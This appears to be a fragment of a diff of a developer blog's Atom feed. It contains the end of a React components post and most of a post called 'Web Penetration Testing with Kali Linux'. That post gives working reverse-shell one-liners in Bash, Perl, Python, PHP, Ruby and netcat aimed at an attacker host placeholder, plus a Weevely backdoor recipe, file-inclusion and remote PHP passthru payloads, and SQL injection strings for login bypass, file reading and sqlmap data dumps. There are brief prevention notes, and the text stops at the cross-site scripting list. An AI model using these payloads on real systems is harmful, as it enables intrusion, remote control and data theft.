+&lt;p&gt;Using &lt;code&gt;react-redux&lt;/code&gt; we can create a responsive web application which enhances the user experience!&lt;/p&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Components in React.js</title><link href="https://jackmckew.dev/components-in-reactjs.html" rel="alternate"></link><published>2020-09-18T00:00:00+10:00</published><updated>2020-09-18T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-18:/components-in-reactjs.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear.&lt;/p&gt;
 &lt;p&gt;In this post let's break down the general structure of a React component. More specifically this will also include using &lt;code&gt;react-redux&lt;/code&gt; for state management in the browser and &lt;code&gt;react-router-dom&lt;/code&gt; for handling dynamic routing. These can both be installed through &lt;code&gt;npm&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="React Logo" class="img-fluid" src="https://jackmckew.dev/img/react-logo.png"/&gt;&lt;/p&gt;
 &lt;p&gt;Let's try to building a component which will represent a landing page on our React app with &lt;code&gt;create-react-app&lt;/code&gt;. We will also want to show a different page whether the user is logged in or not, so our &lt;code&gt;Landing&lt;/code&gt; component will take an input of (aka prop) of &lt;code&gt;isAuthenticated&lt;/code&gt;.&lt;/p&gt;
@@ -862,295 +1139,4 @@ Let's modify A[2][0] = 100
 
 &lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;mapStateToProps&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="nx"&gt;Landing&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Web Penetration Testing with Kali Linux</title><link href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html" rel="alternate"></link><published>2020-09-11T00:00:00+10:00</published><updated>2020-09-11T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-11:/web-penetration-testing-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https …&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://jackmckew.dev/network-hacking-with-kali-linux.html"&gt;Network Hacking with Kali Linux&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://jackmckew.dev/gaining-access-with-kali-linux.html"&gt;Gaining Access with Kali Linux&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#web-information-gathering"&gt;Web Information Gathering&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#discovering-subdomains"&gt;Discovering Subdomains&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#discovering-sensitive-files"&gt;Discovering Sensitive Files&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#exploiting-server-vulnerabilities"&gt;Exploiting Server Vulnerabilities&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#exploiting-file-upload-vulnerabilities-to-gain-access"&gt;Exploiting File Upload Vulnerabilities to Gain Access&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#exploiting-code-execution-vulnerabilities"&gt;Exploiting Code Execution Vulnerabilities&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#bash"&gt;Bash&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#perl"&gt;PERL&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#python"&gt;Python&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#php"&gt;PHP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#ruby"&gt;Ruby&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#netcat"&gt;Netcat&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#local-file-inclusion"&gt;Local File Inclusion&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#remote-file-inclusion"&gt;Remote File Inclusion&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#prevention-of-web-server-exploits"&gt;Prevention of Web Server Exploits&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#sql-injection-and-attacks"&gt;SQL Injection and Attacks&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#discovering-sql-injections-with-form-submissions-post"&gt;Discovering SQL Injections with Form Submissions (POST)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#bypassing-logins-via-injections"&gt;Bypassing Logins via Injections&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#discovering-sql-injections-in-data-retrieval-get"&gt;Discovering SQL Injections in Data Retrieval (GET)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#read-and-writing-files-on-the-server-via-sql"&gt;Read and Writing Files on the Server via SQL.&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#reading"&gt;Reading&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#writing"&gt;Writing&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#use-sqlmap-to-do-the-above-and-more"&gt;Use SQLmap to do the Above and More&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#prevention-of-sql-vulnerabilities"&gt;Prevention of SQL Vulnerabilities&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#cross-site-scriptingxss"&gt;CROSS SITE SCRIPTING(XSS)&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#prevention-of-xss-vulnerabilities"&gt;Prevention of XSS Vulnerabilities&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#to-automatically-discover-web-vulnerabilities"&gt;To Automatically Discover Web Vulnerabilities&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id="web-information-gathering"&gt;Web Information Gathering&lt;/h2&gt;
-&lt;p&gt;As per the last two posts, information is power is security. So we always start by gathering as much information as possible about the target as this may inform us on the best way to carry out an attack.&lt;/p&gt;
-&lt;p&gt;Some helpful tools for learning information about websites are:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;a href="http://whois.domaintools.com/"&gt;http://whois.domaintools.com/&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;Find info about the owner of the target, also possibly webserver results. Look at hosting and info, possibly for social engineering.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://sitereport.netcraft.com/"&gt;https://sitereport.netcraft.com/&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;Shows technologies used on the target. Look at the technologies used for exploits, and coding languages used (code your virus in  languages that the server can understand).  &lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.exploit-db.com/"&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;Database of exploits, make sure versions match.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.robtex.com/"&gt;https://www.robtex.com/&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;Comprehensive DNS information.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Several websites can be installed on a single computer (same IP). If you cannot get into your target try to hack into another website. Another way of getting websites on the same IP (other than Robtex) is to go to bing and search &lt;code&gt;ip:[target_ip]&lt;/code&gt;.&lt;/p&gt;
-&lt;h3 id="discovering-subdomains"&gt;Discovering Subdomains&lt;/h3&gt;
-&lt;p&gt;Use a tool called knock (typically install into /opt on Kali). As with most of the tools on Kali linux, Knock is open source and can be found &lt;a href="https://github.com/guelfoweb/knock"&gt;https://github.com/guelfoweb/knock&lt;/a&gt;.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;git clone &amp;lt;https://github.com/guelfoweb/knock.git&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;cd into the folder.&lt;/li&gt;
-&lt;li&gt;run it using, &lt;code&gt;python knock.py [target]&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;if doesn't work try running the above with --resolve , then run the above again.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Subdomains sometimes contain beta testing applications and scripts. look for exploits in these areas.&lt;/p&gt;
-&lt;h3 id="discovering-sensitive-files"&gt;Discovering Sensitive Files&lt;/h3&gt;
-&lt;p&gt;Use &lt;a href="https://tools.kali.org/web-applications/dirb"&gt;dirb&lt;/a&gt; (use &lt;code&gt;man dirb&lt;/code&gt; for help). DIRB is a web content scanner, which looks for existing (or hidden) Web Objects. DIRB works by launching a dictionary attack against a web server and analyses the response (essentially just try different file names and see if it has a response).&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;dirb [target] [wordlist] [options]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;a / usually means you are in a directory.&lt;/li&gt;
-&lt;li&gt;phpinfo.php - very useful information, robots.txt -hidden information that admins don't want us to see.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id="exploiting-server-vulnerabilities"&gt;Exploiting Server Vulnerabilities&lt;/h2&gt;
-&lt;p&gt;The following are a series of ways to exploit web servers for different outcomes.&lt;/p&gt;
-&lt;h3 id="exploiting-file-upload-vulnerabilities-to-gain-access"&gt;Exploiting File Upload Vulnerabilities to Gain Access&lt;/h3&gt;
-&lt;p&gt;Using a tool called &lt;a href="https://tools.kali.org/maintaining-access/weevely"&gt;Weevely&lt;/a&gt;. Weevely is a stealthy web shell to simulate a telnet-like connection. This is useful as a backdoor and/or to manage web accounts on a web server.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;weevly generate [password] [path+filename]&lt;/code&gt; - create backdoor&lt;/li&gt;
-&lt;li&gt;upload the file.&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;weevly [url_to_file]&lt;/code&gt; - connect to the file&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;help&lt;/code&gt; - help&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Before trying to use tools just browse the website and get a feel for it, look for exploits in features, specifically if the website allows for an upload.&lt;/p&gt;
-&lt;h3 id="exploiting-code-execution-vulnerabilities"&gt;Exploiting Code Execution Vulnerabilities&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;Always experiment with any input boxes you see, as they are executing a command, you might be able to change the command.&lt;/li&gt;
-&lt;li&gt;Can use &amp;amp;&amp;amp; or ; in unix to execute multiple commands in one line. Test if input box allows this.&lt;/li&gt;
-&lt;li&gt;Most servers have python and netcat.&lt;/li&gt;
-&lt;li&gt;Listen for incoming connections, example using netcat:&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;netcat -vv -l -p [port]&lt;/code&gt; - listens for connections on port 8080&lt;/li&gt;
-&lt;li&gt;ie. nc -e /bin/sh [ip] [port] - netcat connection.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by &lt;code&gt;[HOST_IP]&lt;/code&gt; and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.&lt;/p&gt;
-&lt;h4 id="bash"&gt;Bash&lt;/h4&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id="perl"&gt;PERL&lt;/h4&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id="python"&gt;Python&lt;/h4&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id="php"&gt;PHP&lt;/h4&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id="ruby"&gt;Ruby&lt;/h4&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id="netcat"&gt;Netcat&lt;/h4&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;h3 id="local-file-inclusion"&gt;Local File Inclusion&lt;/h3&gt;
-&lt;p&gt;Allows an attacker to read ANY file on the same server. Allows access of outside www folder. /etc/passwd contains all the users for the current os. Go back into the directories to find the above file. So if the url contains something like &lt;code&gt;page=include.php&lt;/code&gt;, do something like &lt;code&gt;page=/../../../../../etc/passwd&lt;/code&gt;. What this does is by instead of loading the specific file that was originally targeted, we can load something that it wasn't intending to load from the same server.&lt;/p&gt;
-&lt;h3 id="remote-file-inclusion"&gt;Remote File Inclusion&lt;/h3&gt;
-&lt;p&gt;If doing this on an actual server the file you want to access has to have a real IP or domain name.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;create a php file with the following:&lt;/li&gt;
-&lt;/ol&gt;
-&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
-2
-3
-4
-5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
-
-&lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"[command]"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-
-&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;p&gt;passthru executes system commands. For example use the netcat command as above.&lt;/p&gt;
-&lt;p&gt;Ensure this file is stored on a webserver that the target can access. Make sure the file extension is &lt;code&gt;.txt&lt;/code&gt; not &lt;code&gt;.php&lt;/code&gt; or it runs on your webserver.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Listen for connections. &lt;code&gt;nc -vv -l -p [port]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Under the &lt;code&gt;page=&lt;/code&gt; part paste the location of your php file. and add a ? to the end to exe as php eg. &lt;code&gt;page=[ip]/[file]?&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id="prevention-of-web-server-exploits"&gt;Prevention of Web Server Exploits&lt;/h2&gt;
-&lt;p&gt;The above only happens because the server allows it and is misconfigured.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;File upload vulnerabilities &lt;ul&gt;
-&lt;li&gt;Do not allow unsafe files to be uploaded.&lt;/li&gt;
-&lt;li&gt;If you are asking for an image ensure it is an image, never allow exe uploads.&lt;/li&gt;
-&lt;li&gt;Check the file type, not the extension.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Code exec vulnerabilities&lt;ul&gt;
-&lt;li&gt;Do'nt use dangerous functions,&lt;/li&gt;
-&lt;li&gt;Filter the input before execution&lt;/li&gt;
-&lt;li&gt;If you have to use function make sure you analyse the input before exec.&lt;/li&gt;
-&lt;li&gt;Use regular expressions (regex).&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;File inclusion vulnerabilties&lt;ul&gt;
-&lt;li&gt;Disable the allow_url_fopen and allow_url_include settings in php (in the /etc/php5/cgi/php.ini)&lt;/li&gt;
-&lt;li&gt;Use static file inclusion (hard code the files)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id="sql-injection-and-attacks"&gt;SQL Injection and Attacks&lt;/h2&gt;
-&lt;p&gt;Obligatory XKCD comic on SQL injection attacks:&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://xkcd.com/327/"&gt;&lt;img alt="Bobby Tables" class="img-fluid" src="https://jackmckew.dev/img/exploits_of_a_mom.png"/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;To connect to a mySQL database &lt;code&gt;mysql -u [username] -h [IP of server]&lt;/code&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;show databases;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;use [database];&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;show tables;&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id="discovering-sql-injections-with-form-submissions-post"&gt;Discovering SQL Injections with Form Submissions (POST)&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;Whenever you see an input box try to break it, try using AND, ORDER BY or '.&lt;/li&gt;
-&lt;li&gt;Look for subtle changes.&lt;/li&gt;
-&lt;li&gt;Enter correct info then ' then use AND, use a # as a comment to terminate early.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;An example of this is a user/password input box(s) may potentially be making a SQL query like &lt;code&gt;SELECT * from accounts where user='$USER_INPUT_BOX_VALUE' and password='$PASSWORD_INPUT_BOX_VALUE'&lt;/code&gt;. We could run an injection on this query by setting our password as &lt;code&gt;123456' AND 1=1#&lt;/code&gt;. This would hopefully execute and confirm that we could inject any SQL query into the webserver database (such as show all passwords).&lt;/p&gt;
-&lt;h3 id="bypassing-logins-via-injections"&gt;Bypassing Logins via Injections&lt;/h3&gt;
-&lt;p&gt;Another neat use would be to inject the SQL query such that the query ends up as &lt;code&gt;SELECT * from accounts where user='admin' and password='wrong_password' or 1=1&lt;/code&gt;, this would potentially log us in as admin without knowing the password at all as the second case in the and statement will be True if the query evaluates 1 to be equal to 1.&lt;/p&gt;
-&lt;h3 id="discovering-sql-injections-in-data-retrieval-get"&gt;Discovering SQL Injections in Data Retrieval (GET)&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;Always try to inject things in the php scripts (in the address bar it will look like index.php&amp;amp;username=xxxx&amp;amp;password=xxxxx)&lt;/li&gt;
-&lt;li&gt;Use ORDER BY after a field eg. &lt;code&gt;index.php&amp;amp;username=xxxx' ORDER BY 1 #&amp;amp;password=xxxxx&lt;/code&gt; Ensure to use the URL encoding for symbols ie. # = %23&lt;/li&gt;
-&lt;li&gt;Order By column 100000 will return an error keep doing order by 1,2,3,4,5 and when you get an error you know the db has that amount of columns&lt;/li&gt;
-&lt;li&gt;Use a union&lt;/li&gt;
-&lt;li&gt;eg. &lt;code&gt;index.php&amp;amp;username=xxxx' union 1,2,3,4,5 #&amp;amp;password=xxxxx&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Swap the numbers with other stuff ie. &lt;code&gt;1,database(),user(),version(),5&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;union select 1, table_name, null, null,5 from information_schema.tables&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id="read-and-writing-files-on-the-server-via-sql"&gt;Read and Writing Files on the Server via SQL.&lt;/h3&gt;
-&lt;p&gt;We can also use SQL injections to read/write files that located on the target computer as well.&lt;/p&gt;
-&lt;h4 id="reading"&gt;Reading&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;union select null, load_file('/etc/passwd'), null, null,null&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id="writing"&gt;Writing&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;union select null, 'example example', null, null,null into outfile '[path]'&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id="use-sqlmap-to-do-the-above-and-more"&gt;Use SQLmap to do the Above and More&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;sqlmap --help&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]"&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --dbs&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;to get the databases&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --current-user&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;to get user&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --current-db&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;current database&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --tables -D [database]&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;gets the tables in the -D database&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --columns -T [table_name] -D [database]&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;gets columns in the tables of the database&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" -T [table_name] -D [database] --dump&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;Get all the data in the table of the database&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id="prevention-of-sql-vulnerabilities"&gt;Prevention of SQL Vulnerabilities&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;Use filters (but can be bypassed)&lt;/li&gt;
-&lt;li&gt;Use a deny list or allow list. (but can be bypassed)&lt;/li&gt;
-&lt;li&gt;Best method is to code the web application in a way that does not allow code injection.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;To do the above you must use parameterised statements. (where the data and the code are separated)&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Prepare you statement most languages have a function for it.&lt;ul&gt;
-&lt;li&gt;So the statement is static and only the value will be inserted eg. prepare(select * from username where username = ?) then when the statement is executed if it will search for the raw input data&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Use filters as second line.&lt;/li&gt;
-&lt;li&gt;Use a user with the least amount of privileges needed.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id="cross-site-scriptingxss"&gt;CROSS SITE SCRIPTING(XSS)&lt;/h2&gt;
-&lt;p&gt;Executed on the people browsing the website not the server. Allows javascript injection onto the page. Code is executed when the page loads.&lt;/p&gt;
-&lt;p&gt;3 main types&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Persistent/Stored XSS&lt;/li&gt;
